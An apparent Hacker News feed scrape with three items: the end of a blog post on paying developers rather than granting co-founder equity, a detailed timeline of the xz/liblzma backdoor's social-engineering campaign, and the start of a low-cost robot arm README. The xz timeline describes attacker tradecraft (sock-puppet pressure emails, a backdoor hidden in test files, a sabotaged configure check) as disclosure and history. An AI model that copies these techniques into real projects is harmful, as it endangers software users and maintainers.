<h3 id="you-dont-need-to-make-sure-they-buy-into-your-vision"><a aria-label="Link to section" href="#you-dont-need-to-make-sure-they-buy-into-your-vision"><span></span></a>You don't need to make sure they buy into your vision</h3>
<p>You'd be surprised how good people are building software about topics they don't care about, for clients they don't like. You also actually have ample time to confirm that you DO vibe.</p>
<h3 id="you-get-far-less-scrutiny"><a aria-label="Link to section" href="#you-get-far-less-scrutiny"><span></span></a>You get far less scrutiny.</h3>
<p>If you're a client, I don't need to question your idea or your abilities.<br>
<strong>You</strong> did all of that work, you don't need to convince a developer it's a good idea and you're good at your job.</p>
<h3 id="you-take-on-100-of-the-risk-for-100-of-the-reward"><a aria-label="Link to section" href="#you-take-on-100-of-the-risk-for-100-of-the-reward"><span></span></a>You take on 100% of the risk for 100% of the reward</h3>
<p>Kind of self explanatory. 50% of your business for an initial development of 3-6-12 months might be WAY underpriced. How do you know? How about putting off that decision, until you have more information?</p>
<h3 id="you-get-a-much-higher-commitment-level"><a aria-label="Link to section" href="#you-get-a-much-higher-commitment-level"><span></span></a>You get a much higher commitment level</h3>
<p>It's like the sales trick where you give something to people so now they feel like they owe you.<br>
<!-- -->They literally owe you a certain outcome or amount of their time, sure.<br>
<!-- -->But I'm talking more about the feeling of seriousness people take their work when it's paid vs when its unpaid.</p>
<p>I can only talk about myself, but I noticed I am in a different mindset, when I'm getting paid. Suddenly I focus solely on quality and go deep, instead of getting subtly annoyed, because someone feels entitled to ask me for more and more work for something that maybe, eventually works out.<br>
<!-- -->Especially in the beginning this feeling is insidious.</p>
<p>Even working solely for myself at the breakneck saas starter, I take it way less serious. Even though it is making money.<br>
<!-- -->There is just something about getting paid and being accountable to another person, that hits different.</p>
<h3 id="you-put-off-decisions-to-a-later-point-with-way-more-information-available"><a aria-label="Link to section" href="#you-put-off-decisions-to-a-later-point-with-way-more-information-available"><span></span></a>You put off decisions to a later point with way more information available</h3>
<p>Trying to assess an unknown persons abilities during 2 zoom calls. Their technical abilities, their personality, their commitment level is a joke.<br>
<!-- -->Trying to discuss percentages that are fair, hours that are fair, how to divide up responsibilities for different stages of the company in the future is a complete stab in the dark.</p>
<h2 id="i-have-absolutely-no-money-now-what"><a aria-label="Link to section" href="#i-have-absolutely-no-money-now-what"><span></span></a>I have absolutely no money, now what?</h2>
<p>Step 1 is realizing the situation you're in. If you're 21, studying economics and just looking to try something crazy, thats awesome. I don't expect you to have the money to pay anyone.</p>
<p>You should just act accordingly. Make it fun. Be grateful. Realize you're essentially asking people for their free time.<br>
<!-- -->Don't pretend to be a grown business man, just because you got some meeting with an investor or a state funded 1500€/month stipend.</p>
<p>Work with people on a similar level.</p>
<p>Software development is a strange field where 20 year olds in university can teach themselves to build a fully functioning product. Realize you're gambling to find such a person.</p>
<p>Developers are crazy. People work on open source products for free for years. People take time after their job of writing code all day, to write code in their side projects.<br>
<!-- -->Try to let someone have a challenging time.</p>
<p>Delete the fucking chatgpt generated list of requirements for the technical co-founder out of your profile.<br>
<!-- -->Its ridiculous. I know you have no idea what that is even saying.<br>
<!-- -->Why would you try to make it look like any other, normal job posting, just without the compensation part?</p>
<p>Make it a goal to save up 10.000€ and hire someone. You can learn a lot from people who are doing this for a living.<br>
<!-- -->Then on your next project you suddenly have experience with a development workflow, pipelines, production and staging environments and sound much more attractive to work with.</p>
<p>Gamble on a lot of people, quickly. Ignore your ridiculous list of requirements. Just try people and see what happens.</p>
<h2 id="other-misconceptions"><a aria-label="Link to section" href="#other-misconceptions"><span></span></a>Other misconceptions</h2>
<h3 id="the-person-who-built-it-initially-needs-to-stick-around"><a aria-label="Link to section" href="#the-person-who-built-it-initially-needs-to-stick-around"><span></span></a>The person who built it initially needs to stick around</h3>
<p>Sure, it's nice and is purely superior to the alternative, but it is way overblown.<br>
<!-- -->In the real world, developers almost never get in on the start of a project. If they do, they might leave 1-2 years later anyway.</p>
<p>Working in an existing project can also be easier, because there are set ways of doing things. There is no decision making required and most problems are figured out.</p>
<p>You're not gonna run into a problem like "what framework do we use?", "what UI library do we use?" "How do we validate client side?" "How do we push to production?".<br>
<!-- -->These are all figured out and decided on. You can find example of almost everything within the code base and keep extending the project.</p>
<h3 id="loyalty-differences-between-co-founders-freelancers-and-employees"><a aria-label="Link to section" href="#loyalty-differences-between-co-founders-freelancers-and-employees"><span></span></a>Loyalty differences between co-founders, freelancers and employees</h3>
<p>A lot of founders think only equity makes people loyal. Equity and buying into the vision maybe.</p>
<p>90% of the world's software projects are run by employees. Often not even direct employees of the company, but employees of the development agency, that is hired by the product company.<br>
<!-- -->For better or worse, people take ownership and responsibility for their work.<br>
<!-- -->We all want to think what we are doing 40 hours a week is important.</p>
<p>Which is why every post from developers starts with "im working on a critical project".<br>
<!-- -->Every designer thinks accessibility is important.<br>
<!-- -->The guy running a bike repair shop thinks your 500€ bike that you bought 2 months ago is unusable trash.<br>
<!-- -->Its just human nature.<br>
<!-- -->And you as an entrepreneurial idea person, think its important to buy into your idea.</p>
<p>I am a fan of aligning incentives as well. I think it just makes sense and the standard situation that all employees are in, where their salary is completely decoupled from the outcome is not ideal.</p>
<p>Generally though I see way less people quitting their paid jobs, than quitting equity based start ups.</p>
<h3 id="realize-your-bias"><a aria-label="Link to section" href="#realize-your-bias"><span></span></a>Realize your bias</h3>
<p>You're the business person. The entrepreneur. The idea guy.<br>
<!-- -->Naturally, you think it's extremely important for everyone to be as into it as you are.<br>
<!-- -->But just like you don't think the design is THAT important, other people don't think the idea is that important.</p>
<p>If you're already 1-2 business co-founders, do not look for a third co-founder who is like half technical and half business.<br>
<!-- -->Let people specialize and adapt over time.</p>
<h3 id="passion"><a aria-label="Link to section" href="#passion"><span></span></a>Passion</h3>
<p>I see founders hammer this one a lot.</p>
<p>To me it shows naivety and a fundamental misunderstanding of how passion works in adults.</p>
<div><p>Passion develops over time</p></div>
<p>You <strong>just</strong> told me about organizational change management and expect me to be into it?<br>
<!-- -->Oh now you expect me to be into solar technology?<br>
<!-- -->Oh now you expect me to be into health care insurance?<br>
<!-- -->Oh now you expect me to be into meal planners for retirement homes?<br>
<!-- -->Oh now you expect me to be into recommending the right tv show?<br>
<!-- -->Oh now you expect me to be passionate about making people go vegan?</p>
<p>Developers work in domains you never heard of all the time. Passion, especially on day 1, is not required.<br>
<!-- -->Developers are passionate about solving problems with code.<br>
<!-- -->Developers are passionate about building cool shit.<br>
<!-- -->Developers are passionate about keyboards and editors and shortcuts.</p>
<p>How passionate do you need your accountant to be?</p>
<p>Ask yourself, how passionate are <strong>you</strong> about <strong>software</strong>? And you want to build one now?</p>
<h2 id="final-thoughts"><a aria-label="Link to section" href="#final-thoughts"><span></span></a>Final Thoughts</h2>
<p>Cut your list of requirements for a technical co-founder. Realize that you're essentially asking someone for a favour, until you have paying customers.</p>
<p>Consider the <strong>costs</strong>, the <strong>opportunity costs</strong> and the <strong>risks</strong> of <strong>paying and not paying</strong> someone to get your idea off the ground.</p>
<p>Don't expect <strong>your</strong> level of passion and <strong>your</strong> commitment level for <strong>your</strong> idea from someone else.<br>
<!-- -->Especially not after 2 meetings.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Timeline of the xz open source attack (687 pts)]]></title>
            <link>https://research.swtch.com/xz-timeline</link>
            <guid>39902241</guid>
            <pubDate>Tue, 02 Apr 2024 03:58:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.swtch.com/xz-timeline">https://research.swtch.com/xz-timeline</a>, See on <a href="https://news.ycombinator.com/item?id=39902241">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <h2>Timeline of the xz open source attack
        
        <div>
        <p>
          
            Posted on Monday, April 1, 2024.
            
          
        </p>
        </div>
        </h2>
        

<p>
Over a period of over two years, an attacker using the name “Jia Tan”
worked as a diligent, effective contributor to the xz compression library,
eventually being granted commit access and maintainership.
Using that access, they installed a very subtle, carefully hidden backdoor into liblzma,
a part of xz that also happens to be a dependency of OpenSSH sshd
on Debian, Ubuntu, Fedora, and other systemd-based Linux systems.
That backdoor watches for the attacker sending hidden commands at the start of an SSH session,
giving the attacker the ability to run an arbitrary command on the target system without logging in:
unauthenticated, targeted remote code execution.

</p><p>
The attack was <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">publicly disclosed on March 29, 2024</a> and
appears to be the first serious known supply chain attack on widely used open source software.
It marks a watershed moment in open source supply chain security, for better or worse.

</p><p>
This post is a detailed timeline that I have constructed of the
social engineering aspect of the attack, which appears to date
back to late 2021.
Key events have bold times.

</p><p>
Corrections or additions welcome on <a href="https://bsky.app/profile/swtch.com/post/3kp4my7wdom2q">Bluesky</a>, <a href="https://hachyderm.io/@rsc/112199506755478946">Mastodon</a>, or <a href="mailto:rsc@swtch.com">email</a>.
<a href="#prologue"></a></p><h2 id="prologue"><a href="#prologue">Prologue</a></h2>


<p>
<b>2005–2008</b>: <a href="https://github.com/kobolabs/liblzma/blob/87b7682ce4b1c849504e2b3641cebaad62aaef87/doc/history.txt">Lasse Collin, with help from others</a>, designs the .xz file format using the LZMA compression algorithm, which compresses files to about 70% of what gzip did [1]. Over time this format becomes widely used for compressing tar files, Linux kernel images, and many other uses.
<a href="#jia_tan_arrives_on_scene_with_supporting_cast"></a></p><h2 id="jia_tan_arrives_on_scene_with_supporting_cast"><a href="#jia_tan_arrives_on_scene_with_supporting_cast">Jia Tan arrives on scene, with supporting cast</a></h2>


<p>
<b>2021-10-29</b>: Jia Tan sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00512.html">first, innocuous patch</a> to the xz-devel mailing list, adding “.editorconfig” file.

</p><p>
<b>2021-11-29</b>: Jia Tan sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00519.html">second innocuous patch</a> to the xz-devel mailing list, fixing an apparent reproducible build problem. More patches that seem (even in retrospect) to be fine follow.

</p><p>
<b>2022-04-19</b>: Jia Tan sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00553.html">yet another innocuous patch</a> to the xz-devel mailing list.

</p><p>
<b>2022-04-22</b>: “Jigar Kumar” sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00557.html">first of a few emails</a> complaining about Jia Tan’s patch not landing. (“Patches spend years on this mailing list. There is no reason to think anything is coming soon.”) At this point, Lasse Collin has already landed four of Jia Tan’s patches, marked by “Thanks to Jia Tan” in the commit message.

</p><p>
<b>2022-05-19</b>: “Dennis Ens” sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00562.html">mail to xz-devel</a> asking if XZ for Java is maintained.

</p><p>
<b>2022-05-19</b>: Lasse Collin <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00563.html">replies</a> apologizing for slowness and adds “Jia Tan has helped me off-list with XZ Utils and he might have a bigger role in the future at least with XZ Utils. It's clear that my resources are too limited (thus the many emails waiting for replies) so something has to change in the long term.”

</p><p>
<b>2022-05-27</b>: Jigar Kumar sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00565.html">pressure email</a> to patch thread. “Over 1 month and no closer to being merged. Not a surprise.”

</p><p>
<b>2022-06-07</b>: Jigar Kumar sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.html">pressure email</a> to Java thread. “Progress will not happen until there is new maintainer. XZ for C has sparse commit log too. Dennis you are better off waiting until new maintainer happens or fork yourself. Submitting patches here has no purpose these days. The current maintainer lost interest or doesn't care to maintain anymore. It is sad to see for a repo like this.”

</p><p>
<b>2022-06-08</b>: Lasse Collin <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html">pushes back</a>. “I haven't lost interest but my ability to care has been fairly limited mostly due to longterm mental health issues but also due to some other things. Recently I've worked off-list a bit with Jia Tan on XZ Utils and perhaps he will have a bigger role in the future, we'll see. It's also good to keep in mind that this is an unpaid hobby project.”

</p><p>
<b>2022-06-10</b>: Lasse Collin merges <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=aa75c5563a760aea3aa23d997d519e702e82726b">first commit with Jia Tan as author in git metadata</a> (“Tests: Created tests for hardware functions”).

</p><p>
<b>2022-06-14</b>: Jugar Kumar sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00568.html">pressure email</a>. “With your current rate, I very doubt to see 5.4.0 release this year. The only progress since april has been small changes to test code. You ignore the many  patches bit rotting away on this mailing list. Right now you choke your repo. Why wait until 5.4.0 to change maintainer? Why delay what your repo needs?”

</p><p>
<b>2022-06-21</b>: Dennis Ens sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00569.html">pressure email</a>. “I am sorry about your mental health issues, but its important to be aware of your own limits. I get that this is a hobby project for all contributors, but the community desires more. Why not pass on maintainership for XZ for C so you can give XZ for Java more attention? Or pass on XZ for Java to someone else to focus on XZ for C? Trying to maintain both means that neither are maintained well.”

</p><p>
<b>2022-06-21</b>: Lasse Collin <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00571.html">replies</a>: “As I have hinted in earlier emails, Jia Tan may have a bigger role in the project in the future. He has been helping a lot off-list and is practically a co-maintainer already. :-) I know that not much has happened in the git repository yet but things happen in small steps. In any case some change in maintainership is already in progress at least for XZ Utils.”

</p><p>
<b>2022-06-22</b>: Jigar Kumar sends <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00570.html">pressure email</a> to C patch thread. “Is there any progress on this? Jia I see you have recent commits. Why can't you commit this yourself?”
<a href="#jia_tan_becomes_maintainer"></a></p><h2 id="jia_tan_becomes_maintainer"><a href="#jia_tan_becomes_maintainer">Jia Tan becomes maintainer</a></h2>


<p>
At this point Lasse seems to have started working even more closely with Jia Tan. Evan Boehs <a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor">observes</a> that Jigar Kumar and Dennis Ens both had nameNNN@mailhost email addresses that never appeared elsewhere on the internet, nor again in xz-devel. It seems likely that they were fakes created to push Lasse to give Jia more control. It worked. Over the next few months, Jia started replying to threads on xz-devel authoritatively about the upcoming 5.4.0 release.

</p><p>
<b>2022-09-27</b>: Jia Tan gives <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00593.html">release summary</a> for 5.4.0. (“The 5.4.0 release that will contain the multi threaded decoder is planned for December. The list of open issues related to 5..4.0 [sic] in general that I am tracking are...”)

</p><p>
<b>2022-11-30</b>: Lasse Collin <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=764955e2d4f2a5e8d6d6fec63af694f799e050e7">changes bug report email</a> from his personal address to an alias that goes to him and Jia Tan, notes in README that “the project maintainers Lasse Collin and Jia Tan can be reached via <a href="mailto:xz@tukaani.org">xz@tukaani.org</a>”.

</p><p>
<b>2022-12-30</b>: Jia Tan merges <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=8ace358d65059152d9a1f43f4770170d29d35754">first commit directly into the xz repo</a> (“CMake: Update .gitignore for CMake artifacts from in source build”). At this point we know they have commit access.

</p><p>
<b>2023-01-11</b>: Lasse Collin <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=18b845e69752c975dfeda418ec00eda22605c2ee">tags and builds his final release</a>, v5.4.1.

</p><p>
<b>2023-03-18</b>: Jia Tan <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6ca8046ecbc7a1c81ee08f544bfd1414819fb2e8">tags and builds their first release</a>, v5.4.2.

</p><p>
<b>2023-03-20</b>: Jia Tan <a href="https://github.com/google/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd">updates Google oss-fuzz configuration</a> to send bugs to them.

</p><p>
<b>2023-06-22</b>: Hans Jansen sends a pair of patches, merged by Lasse Collin, that use the “<a href="https://maskray.me/blog/2021-01-18-gnu-indirect-function">GNU indirect function</a>” feature to select a fast CRC function at startup time. This change is important because it provides a hook by which the backdoor code can modify the global function tables before they are remapped read-only. While this change could be an innocent performance optimization by itself, Hans Jansen returns in 2024 to promote the backdoored xz and otherwise does not exist on the internet.

</p><p>
<b>2023-07-07</b>: Jia Tan <a href="https://github.com/google/oss-fuzz/commit/d2e42b2e489eac6fe6268e381b7db151f4c892c5">disables ifunc support during oss-fuzz builds</a>, claiming ifunc is incompatible with address sanitizer. This may well be innocuous on its own, although it is also more groundwork for using ifunc later.

</p><p>
<b>2024-01-19</b>: Jia Tan <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=c26812c5b2c8a2a47f43214afe6b0b840c73e4f5">moves web site to GitHub pages</a>, giving them control over the XZ Utils web page. Lasse Collin presumably created the DNS records for the xz.tukaani.org subdomain that points to GitHub pages. After the attack was discovered, Lasse Collin deleted this DNS record to move back to <a href="https://research.swtch.com/tukaani.org">tukaani.org</a>, which he controls.
<a href="#attack_begins"></a></p><h2 id="attack_begins"><a href="#attack_begins">Attack begins</a></h2>


<p>
<b>2024-02-23</b>: Jia Tan <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">merges hidden backdoor binary code</a> well hidden inside some binary test input files. The associated README claims “This directory contains bunch of files to test handling of .xz, .lzma (LZMA_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better "source code" than the files themselves.”

</p><p>
<b>2024-02-24</b>: Jia Tan <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429">tags and builds v5.6.0</a> and publishes an xz-5.6.0.tar.gz distribution with an extra, malicious build-to-host.m4 that adds the backdoor when building a deb/rpm package. This m4 file is not present in the source repository, but many other legitimate ones are added during package as well, so it’s not suspicious by itself. But the script has been modified from the usual copy to add the backdoor. See my <a href="https://research.swtch.com/xz-script">xz attack shell script walkthrough post</a> for more.

</p><p>
<b>2024-02-24</b>: Gentoo <a href="https://bugs.gentoo.org/925415">starts seeing crashes in 5.6.0</a>. This seems to be an actual ifunc bug, rather than a bug in the hidden backdoor, since this is the first xz with Hans Jansen’s ifunc changes.

</p><p>
<b>2024-02-26</b>: Debian <a href="https://tracker.debian.org/news/1506761/accepted-xz-utils-560-01-source-into-unstable/">adds xz-utils 5.6.0-0.1</a> to unstable.

</p><p>
<b>2024-02-28</b>: Debian <a href="https://tracker.debian.org/news/1507917/accepted-xz-utils-560-02-source-into-unstable/">adds xz-utils 5.6.0-0.2</a> to unstable.

</p><p>
<b>2024-02-29</b>: On GitHub, @teknoraver <a href="https://github.com/systemd/systemd/pull/31550">sends pull request</a> to stop linking liblzma into libsystemd. It appears that this would have defeated the attack. <a href="https://doublepulsar.com/inside-the-failed-attempt-to-backdoor-ssh-globally-that-got-caught-by-chance-bbfe628fafdd">Kevin Beaumont speculates</a> that knowing this was on the way may have accelerated the attacker’s schedule. It is unclear whether any earlier discussions exist that would have tipped them off.

</p><p>
<b>2024-02-28</b>: Jia Tan <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=a100f9111c8cc7f5b5f0e4a5e8af3de7161c7975">breaks landlock detection</a> in configure script by adding a subtle typo in the C program used to check for <a href="https://docs.kernel.org/userspace-api/landlock.html">landlock support</a>. The configure script tries to build and run the C program to check for landlock support, but since the C program has a syntax error, it will never build and run, and the script will always decide there is no landlock support. Lasse Collin is listed as the committer; he may have missed the subtle typo, or the author may be forged. Probably the former, since Jia Tan did not bother to forge committer on his many other changes. This patch seems to be setting up for something besides the sshd change, since landlock support is part of the xz command and not liblzma. Exactly what is unclear.

</p><p>
<b>2024-03-04</b>: RedHat distributions <a href="https://bugzilla.redhat.com/show_bug.cgi?id=2267598">start seeing Valgrind errors</a> in liblzma’s <code>_get_cpuid</code> (the entry to the backdoor).

</p><p>
<b>2024-03-05</b>: The <a href="https://github.com/systemd/systemd/commit/3fc72d54132151c131301fc7954e0b44cdd3c860">libsystemd PR is merged</a> to remove liblzma.

</p><p>
<b>2024-03-05</b>: Debian <a href="https://tracker.debian.org/news/1509743/xz-utils-560-02-migrated-to-testing/">adds xz-utils 5.6.0-0.2</a> to testing.

</p><p>
<b>2024-03-05</b>: Jia Tan commits <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ed957d39426695e948b06de0ed952a2fbbe84bd1">two ifunc</a> <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=4e1c97052b5f14f4d6dda99d12cbbd01e66e3712">bug fixes</a>. These seem to be real fixes for the actual ifunc bug. One commit links to the Gentoo bug and also typos an <a href="https://gcc.gnu.org/bugzilla/show_bug.cgi?id=114115">upstream GCC bug</a>.

</p><p>
<b>2024-03-08</b>: Jia Tan <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=82ecc538193b380a21622aea02b0ba078e7ade92">commits purported Valgrind fix</a>. This is a misdirection, but an effective one.

</p><p>
<b>2024-03-09</b>: Jia Tan <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1">commits updated backdoor files</a>. This is the actual Valgrind fix, changing the two test files containing the attack code. “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.”

</p><p>
<b>2024-03-09</b>: Jia Tan <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=fd1b975b7851e081ed6e5cf63df946cd5cbdbb94">tags and build v5.6.1</a> and publishes xz 5.6.1 distribution, containing new backdoor. To date I have not seen any analysis of how the old and new backdoors differ.

</p><p>
<b>2024-03-20</b>: Lasse Collin sends LKML a patch set <a href="https://lkml.org/lkml/2024/3/20/1009">replacing his personal email</a> with <a href="https://lkml.org/lkml/2024/3/20/1008">both himself and Jia Tan</a> as maintainers of the xz compression code in the kernel. There is no indication that Lasse Collin was acting nefariously here, just cleaning up references to himself as sole maintainer. Of course, Jia Tan may have prompted this, and being able to send xz patches to the Linux kernel would have been a nice point of leverage for Jia Tan's future work. We're not at <a href="https://research.swtch.com/nih">trusting trust</a> levels yet, but it would be one step closer.

</p><p>
<b>2024-03-25</b>: Hans Jansen is back (!), <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708">filing a Debian bug</a> to get xz-utils updated to 5.6.1. Like in the 2022 pressure campaign, more name###@mailhost addresses that don’t otherwise exist on the internet show up to advocate for it.

</p><p>
<b>2024-03-28</b>: Jia Tan <a href="https://bugs.launchpad.net/ubuntu/+source/xz-utils/+bug/2059417">files an Ubuntu bug</a> to get xz-utils updated to 5.6.1 from Debian.
<a href="#attack_detected"></a></p><h2 id="attack_detected"><a href="#attack_detected">Attack detected</a></h2>


<p>
<b>2024-03-28</b>: Andres Freund discovers bug, privately notifies Debian and distros@openwall. RedHat assigns CVE-2024-3094.

</p><p>
<b>2024-03-28</b>: Debian <a href="https://tracker.debian.org/news/1515519/accepted-xz-utils-561really545-1-source-into-unstable/">rolls back 5.6.1</a>, introducing 5.6.1+really5.4.5-1.

</p><p>
<b>2024-03-29</b>: Andres Freund <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">posts backdoor warning</a> to public oss-security@openwall list, saying he found it “over the last weeks”.

</p><p>
<b>2024-03-29</b>: RedHat <a href="https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users">announces that the backdoored xz shipped</a> in Fedora Rawhide and Fedora Linux 40 beta.

</p><p>
<b>2024-03-30</b>: Debian <a href="https://fulda.social/@Ganneff/112184975950858403">shut down builds</a> to rebuild their build machines using Debian stable (in case the malware xz escaped their sandbox?).
<a href="#further_reading"></a></p><h2 id="further_reading"><a href="#further_reading">Further Reading</a></h2>
<ul>
<li>
Evan Boehs, <a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor">Everything I know about the XZ backdoor</a> (2024-03-29).
</li><li>
Filippo Valsorda, <a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b">Bluesky</a> re backdoor operation (2024-03-30).
</li><li>
Michał Zalewski, <a href="https://lcamtuf.substack.com/p/technologist-vs-spy-the-xz-backdoor">Techies vs spies: the xz backdoor debate</a> (2024-03-30).
</li><li>
Michał Zalewski, <a href="https://lcamtuf.substack.com/p/oss-backdoors-the-allure-of-the-easy">OSS backdoors: the folly of the easy fix</a> (2024-03-31).
</li><li>
Connor Tumbleson, <a href="https://connortumbleson.com/2024/03/31/watching-xz-unfold-from-afar/">Watching xz unfold from afar</a> (2024-03-31).
</li><li>
nugxperience, <a href="https://twitter.com/nugxperience/status/1773906926503591970">Twitter</a> re awk and rc4 (2024-03-29)
</li><li>
birchb0y, <a href="https://twitter.com/birchb0y/status/1773871381890924872">Twitter</a> re time of day of commit vs level of evil (2024-03-29)
</li><li>
Dan Feidt, <a href="https://unicornriot.ninja/2024/xz-utils-software-backdoor-uncovered-in-years-long-hacking-plot/">'xz utils' Software Backdoor Uncovered in Years-Long Hacking Plot</a> (2024-03-30)
</li><li>
smx-smz, <a href="https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504">[WIP] XZ Backdoor Analysis and symbol mapping</a>
</li><li>
Dan Goodin, <a href="https://arstechnica.com/security/2024/04/what-we-know-about-the-xz-utils-backdoor-that-almost-infected-the-world/">What we know about the xz Utils backdoor that almost infected the world</a> (2024-04-01) <br>
</li><li>
Akamai Security Intelligence Group, <a href="https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know">XZ Utils Backdoor — Everything You Need to Know, and What You Can Do</a> (2024-04-01)
</li><li>
Kevin Beaumont, <a href="https://doublepulsar.com/inside-the-failed-attempt-to-backdoor-ssh-globally-that-got-caught-by-chance-bbfe628fafdd">Inside the failed attempt to backdoor SSH globally — that got caught by chance</a> (2024-03-31)
</li><li>
amlweems, <a href="https://github.com/amlweems/xzbot">xzbot: notes, honeypot, and exploit demo for the xz backdoor</a> (2024-04-01)
</li><li>
Rhea's Substack, <a href="https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and">XZ Backdoor: Times, damned times, and scams</a> (2024-03-30)</li></ul>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Low Cost Robot Arm (414 pts)]]></title>
            <link>https://github.com/AlexanderKoch-Koch/low_cost_robot</link>
            <guid>39902205</guid>
            <pubDate>Tue, 02 Apr 2024 03:50:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/AlexanderKoch-Koch/low_cost_robot">https://github.com/AlexanderKoch-Koch/low_cost_robot</a>, See on <a href="https://news.ycombinator.com/item?id=39902205">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">$250 Robot Arm</h2><a id="user-content-250-robot-arm" aria-label="Permalink: $250 Robot Arm" href="#250-robot-arm"></a></p>
<p dir="auto">This repository contains the files to build and control a low-cost robot arm that costs about $250. You can also build a second robot arm (the leader arm) to control the other arm (the follower arm). The design of the leader is inspired by the <a href="https://github.com/wuphilipp/gello_mechanical">GELLO project</a> but is simpler to build.
This robot arm uses Dynamixel XL430 and Dynamixel XL330 servo motors. The XL430 motors are almost twice as strong and are used for the first two joints.
The XL330 motors are weaker but weigh only 18g each. This makes the arm very lightweight and fast.
Dynamixel sells the U2D2 adapter to connect the servos to a computer. However, this is very expensive and the latency is very high. This build uses another cheaper adapter board instead.
The robot arm can be controlled with the Dynamixel SDK: <code>pip install dynamixel-sdk</code></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/AlexanderKoch-Koch/low_cost_robot/blob/main/pictures/robot_portait.jpg"><img src="https://github.com/AlexanderKoch-Koch/low_cost_robot/raw/main/pictures/robot_portait.jpg" alt="Robot Arm"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Follower Arm</h2><a id="user-content-follower-arm" aria-label="Permalink: Follower Arm" href="#follower-arm"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Required Materials</h3><a id="user-content-required-materials" aria-label="Permalink: Required Materials" href="#required-materials"></a></p>
<table>
<thead>
<tr>
<th>Part</th>
<th>Cost</th>
<th>Buying link</th>
<th>Specs</th>
</tr>
</thead>
<tbody>
<tr>
<td>2x Dynamixel xl430-w250</td>
<td>$100</td>
<td><a href="https://www.robotis.us/dynamixel-xl430-w250-t/" rel="nofollow">https://www.robotis.us/dynamixel-xl430-w250-t/</a></td>
<td><a href="https://emanual.robotis.com/docs/en/dxl/x/xl430-w250/" rel="nofollow">https://emanual.robotis.com/docs/en/dxl/x/xl430-w250/</a></td>
</tr>
<tr>
<td>4x Dynamixel xl330-m288</td>
<td>$96</td>
<td><a href="https://www.robotis.us/dynamixel-xl330-m288-t/" rel="nofollow">https://www.robotis.us/dynamixel-xl330-m288-t/</a></td>
<td><a href="https://emanual.robotis.com/docs/en/dxl/x/xl330-m288/" rel="nofollow">https://emanual.robotis.com/docs/en/dxl/x/xl330-m288/</a></td>
</tr>
<tr>
<td>XL330 Idler Wheel</td>
<td>$10</td>
<td><a href="https://www.robotis.us/fpx330-h101-4pcs-set/" rel="nofollow">https://www.robotis.us/fpx330-h101-4pcs-set/</a></td>
<td></td>
</tr>
<tr>
<td>XL430 Idler Wheel</td>
<td>$7</td>
<td><a href="https://www.robotis.us/hn11-i101-set/" rel="nofollow">https://www.robotis.us/hn11-i101-set/</a></td>
<td></td>
</tr>
<tr>
<td>Serial bus servo driver board</td>
<td>$10</td>
<td><a href="https://a.co/d/7C3RUYU" rel="nofollow">https://a.co/d/7C3RUYU</a></td>
<td></td>
</tr>
<tr>
<td>Voltage Reducer</td>
<td>$4</td>
<td><a href="https://a.co/d/iWJlp6A" rel="nofollow">https://a.co/d/iWJlp6A</a></td>
<td></td>
</tr>
<tr>
<td>12V Power Supply</td>
<td>$12</td>
<td><a href="https://a.co/d/40o8uMN" rel="nofollow">https://a.co/d/40o8uMN</a></td>
<td></td>
</tr>
<tr>
<td>Table Clamp</td>
<td>$6</td>
